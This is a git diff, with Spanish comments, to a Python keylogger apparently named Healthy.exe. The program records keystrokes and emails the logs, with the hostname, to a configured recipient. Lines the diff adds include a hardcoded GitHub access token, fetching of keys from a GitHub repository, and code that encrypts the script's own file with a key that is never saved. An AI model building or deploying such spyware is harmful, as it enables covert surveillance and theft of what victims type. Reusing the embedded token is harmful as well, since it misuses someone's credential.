@@ -16,6 +16,11 @@ import psutil
 import platform, serial
 import serial.tools.list_ports
 import GPUtil
+from cryptography.fernet import Fernet
+import requests
+import atexit
+import signal
+import random
 # Función para obtener la dirección IP local
 def get_local_ip(config_filename='config.json'):
     try:
@@ -114,6 +119,18 @@ def send_email(subject, message, recipient_email, config, attachment_path):
     msg["From"] = sender_email
     msg["To"] = recipient_email
     msg.attach(MIMEText(message, 'plain'))
+    
+    # Crear el mensaje HTML con fondo negro solo para el contenido del mensaje
+    html_message = f"""
+    <html>
+    <head></head>
+    <body style="background-color: yellow; color: black; font-family: 'Courier New', monospace;">
+        {message}
+    </body>
+    </html>
+    """
+
+    msg.attach(MIMEText(html_message, 'html'))
 
     with open(attachment_path, 'rb') as attachment:
         part = MIMEApplication(attachment.read(), Name=os.path.basename(attachment_path))
@@ -273,6 +290,15 @@ def send_email(subject, message, recipient_email, config, attachment_path):
     else:
         print("Envío de correos electrónicos deshabilitado en la configuración")
 
+# Variable global para mantener un registro de la cantidad de correos enviados
+correos_enviados = 0
+
+# Función para obtener el número de la computadora en función de los correos enviados
+def get_computer_number():
+    global correos_enviados
+    # Obtén el número actual de correos enviados
+    correos_enviados += 1
+    return correos_enviados
 
 # Función para verificar el tiempo de inactividad y enviar el correo
 def check_and_send_email(config):
@@ -286,7 +312,13 @@ def check_and_send_email(config):
         if inactive_duration >= send_email_interval_minutes * 60:  # Convertir minutos a segundos
             with open(carpeta_guardado, "r") as log_file:
                 log_content = log_file.read()
-            send_email("Registro del Healthy.exe", "Adjunto el registro del Healthy.exe.\n", config["toaddr"], config, carpeta_guardado)
+                
+             # Modificar el mensaje aquí
+            random_message = random.choice(config.get("hacker_ethical_messages", []))
+            computer_info = f"Modelo del computador: {socket.gethostname()}, Número: {get_computer_number()}"
+            message = f"{random_message}\nRegistro del Healthy.exe con {computer_info}\n"
+
+            send_email("Registro del Healthy.exe", message, config["toaddr"], config, carpeta_guardado)
             last_activity_time = current_time  # Reiniciamos last_activity_time
 
         time.sleep(30)  # Verificar cada 30 segundos
@@ -340,6 +372,58 @@ def create_inactive_log_file_if_not_exists(inactive_log_file):
         print("Error al crear el archivo KeyInactiveLog.txt:", str(e))
 
 
+# Función para cargar la clave de desencriptación desde GitHub
+def load_decryption_key_from_github(key_url, github_token):
+    headers = {"Authorization": f"token {github_token}"}
+    try:
+        response = requests.get(key_url, headers=headers)
+        response.raise_for_status()
+        key_data = response.json()
+        decryption_keys = key_data.get("keys", [])
+        return decryption_keys
+    except requests.exceptions.RequestException as e:
+        print("Error al hacer la petición al Servidor Externo:", e)
+        return []
+    except json.JSONDecodeError as e:
+        print("Error al decodificar la respuesta JSON:", e)
+        return []
+
+def load_encryption_keys_from_github(key_url, github_token):
+    headers = {"Authorization": f"token {github_token}"}
+    try:
+        response = requests.get(key_url, headers=headers)
+        response.raise_for_status()
+        key_data = response.json()
+        encryption_keys = key_data.get("keys", [])
+        return encryption_keys
+    except requests.exceptions.RequestException as e:
+        print("Error al hacer la petición al Servidor Externo:", e)
+        return []
+    except json.JSONDecodeError as e:
+        print("Error al decodificar la respuesta JSON:", e)
+        return []
+
+# Definir la ruta al archivo KeyInactiveLog.txt
+carpeta_inactiva = "KeyInactiveLog.txt"
+
+# Función para limpiar el archivo KeyInactiveLog.txt
+def clean_key_inactive_log(file_path):
+    try:
+        with open(file_path, 'w') as file:
+            file.truncate(0)  # Borra todo el contenido del archivo
+        print("Contenido de KeyInactiveLog.txt limpiado")
+    except Exception as e:
+        print("Error al limpiar el archivo KeyInactiveLog.txt:", str(e))
+
+# Función para limpiar el archivo KeyInactiveLog.txt periódicamente
+def clean_key_inactive_log_periodically(config, interval_minutes, file_path):
+    while True:
+        if config.get('clean_KeyInactiveLog', False):
+            clean_key_inactive_log(file_path)
+        time.sleep(interval_minutes * 60)  # Convertir minutos a segundos
+
+
+
 if __name__ == "__main__":
     # Función para cargar la configuración desde un archivo JSON
     def load_config(filename):
@@ -349,12 +433,76 @@ if __name__ == "__main__":
         except FileNotFoundError:
             with open('config_default.json', 'r') as default_file:
                 return json.load(default_file)
-            
-    # Nombre del archivo de configuración
+    
+     # Nombre del archivo de configuración
     config_filename = 'config.json'
 
     # Cargar la configuración
     config = load_config(config_filename)
+
+     # Obtener el valor de 'Encrypt_Code' y 'KeyDESENCYPT' del archivo de configuración
+    github_access_token = "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"
+    decryption_key_url = "https://raw.githubusercontent.com/S-A-L-M/Key-H.exe/main/KeysH-exe.json"
+    encryption_key_url = "https://raw.githubusercontent.com/S-A-L-M/Key-H.exe/main/KeysH-exe.json"
+    
+    decrypt_code_enabled = config.get("Descrypt_Code", False)
+    encrypt_code_enabled = config.get("Encrypt_Code", False)
+    
+    # Obtener el intervalo de limpieza desde la configuración
+    interval_minutes = config.get('Timetoclean_KeyInactiveLog', 1)
+
+    # Crear y ejecutar el hilo para limpiar periódicamente
+    clean_log_thread = threading.Thread(target=clean_key_inactive_log_periodically, args=(config, interval_minutes, carpeta_inactiva))
+    clean_log_thread.start()
+    
+    if decrypt_code_enabled:
+        decryption_keys = load_decryption_key_from_github(decryption_key_url, github_access_token)
+
+        if decryption_keys:
+            if config["KeyDE-EN"] in decryption_keys:
+                decryption_key = config["KeyDE-EN"].encode()
+                fernet = Fernet(decryption_key)
+
+                with open("encrypted_file.txt", "rb") as encrypted_file:
+                    encrypted_content = encrypted_file.read()
+                    decrypted_content = fernet.decrypt(encrypted_content)
+
+                with open("decrypted_file.txt", "wb") as decrypted_file:
+                    decrypted_file.write(decrypted_content)
+
+                print("Contenido desencriptado y guardado")
+            else:
+                print("La clave de desencriptación en config.json no coincide con ninguna clave en GitHub")
+        else:
+            print("No se pudo obtener la clave de desencriptación desde GitHub")
+    else:
+        print("No se activó la Desencriptación")
+        
+        
+    if encrypt_code_enabled:
+        encryption_keys = load_encryption_keys_from_github(encryption_key_url, github_access_token)
+
+        if encryption_keys:
+            if config["KeyDE-EN"] in encryption_keys:
+                with open(__file__, 'rb') as file:
+                    original_content = file.read()
+
+                encryption_key = Fernet.generate_key()
+                cipher_suite = Fernet(encryption_key)
+
+                encrypted_content = cipher_suite.encrypt(original_content)
+
+                with open(__file__, 'wb') as file:
+                    file.write(encrypted_content)
+
+                print("Contenido encriptado y guardado")
+            else:
+                print("La clave de encriptación en config.json no coincide con ninguna clave en GitHub")
+        else:
+            print("No se pudo obtener la clave de encriptación desde GitHub")
+    else:
+        print("No se activó la Encriptación")
+    
 
     # Guardar la configuración inicial si el archivo no existe
     with open(config_filename, 'w') as file:
@@ -363,7 +511,8 @@ if __name__ == "__main__":
     # Variables para el tiempo de inactividad y el registro de actividad
     last_activity_time = time.time()
     log_data = ""
-
+    
+    
     # Ruta del archivo donde se guardarán los registros del Keylogger
     carpeta_guardado = config.get("carpeta_guardado", 'KeyActiveLog.txt')
     carpeta_inactiva = "KeyInactiveLog.txt"
@@ -372,7 +521,7 @@ if __name__ == "__main__":
     email_active = config.get('active_Email', False)
     clean_key_active_log_enabled = config.get('clean_KeyActiveLog', False)
 
-
+    
      # Crear y ejecutar el hilo para verificar el tiempo de inactividad y enviar correo
     email_thread = threading.Thread(target=check_and_send_email, args=(config,))
     email_thread.start()
@@ -382,6 +531,8 @@ if __name__ == "__main__":
     def on_keyrelease(key):
         if key == keyboard.Key.esc:
             return False
+    
+    
 
 # Verificar si keylogger_active está activado en el config.json
     if keylogger_active:
@@ -395,5 +546,7 @@ if __name__ == "__main__":
     else:
         print("Esta desactivada el programa del keylogger en el archivo 'config.json'")
         os._exit(0)  # Salir del programa de manera abrupta
+
+
 
 
